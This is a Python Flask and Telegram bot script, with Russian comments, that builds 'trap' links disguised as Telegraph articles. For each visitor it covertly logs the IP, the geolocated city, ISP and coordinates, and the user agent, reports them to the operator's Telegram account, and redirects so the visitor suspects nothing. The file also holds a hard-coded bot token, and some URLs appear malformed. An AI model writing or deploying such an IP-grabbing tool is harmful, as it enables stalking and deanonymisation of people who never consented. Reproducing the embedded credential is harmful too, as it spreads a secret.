import telebot
import requests
from flask import Flask, request, redirect

# --- ТВОИ НАСТРОЙКИ ---
API_TOKEN = '8513483559:AAENitdFw7owc388Bc77ebszoFtk08U7PZ8'
ADMIN_ID = 8347374252 

bot = telebot.TeleBot(API_TOKEN, threaded=False)
app = Flask(__name__)

@app.route('/v/', defaults={'article_id': ''})
@app.route('/v/<path:article_id>')
def logger(article_id):
    # На Vercel IP берется из заголовка x-forwarded-for
    ip_raw = request.headers.get('x-forwarded-for', request.remote_addr)
    ip = ip_raw.split(',')[0].strip() if ip_raw else request.remote_addr
    ua = request.headers.get('user-agent')
    
    geo_info = "📍 Данные GeoIP недоступны"
    try:
        # Пробив по IP (город, страна, провайдер)
        r = requests.get(f"http://ip-api.com{ip}?lang=ru", timeout=5).json()
        if r.get('status') == 'success':
            geo_info = (f"🌍 Страна: {r.get('country')}\n"
                        f"🏙 Город: {r.get('city')}\n"
                        f"📡 Провайдер: {r.get('isp')}\n"
                        f"📍 Координаты: {r.get('lat')}, {r.get('lon')}")
    except: pass

    report = (f"🎯 *КЛИК ПО ССЫЛКЕ!*\n\n"
              f"👤 *IP:* `{ip}`\n"
              f"{geo_info}\n"
              f"📱 *Устройство:* `{ua}`\n"
              f"🔗 *Путь:* `{article_id}`")
    
    try:
        bot.send_message(ADMIN_ID, report, parse_mode="Markdown")
    except: pass
    
    return redirect(f"https://telegra.ph{article_id}")

@app.route('/' + API_TOKEN, methods=['POST'])
def get_message():
    json_string = request.get_data().decode('utf-8')
    update = telebot.types.Update.de_json(json_string)
    bot.process_new_updates([update])
    return "!", 200

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, "👋 Привет! Пришли ссылку на Telegraph, и я сделаю ловушку.")

@bot.message_handler(func=lambda m: "telegra.ph" in m.text.lower())
def create_link(message):
    path = message.text.split("telegra.ph/")[-1] if "telegra.ph/" in message.text else ""
    # Домен подставится сам после деплоя
    domain = request.host
    trap_link = f"https://{domain}/v/{path}"
    bot.send_message(message.chat.id, f"✅ *Твоя ловушка готова:*\n\n`{trap_link}`", parse_mode="Markdown")

@app.route('/')
def index():
    return "Бот запущен и ждет кликов!"
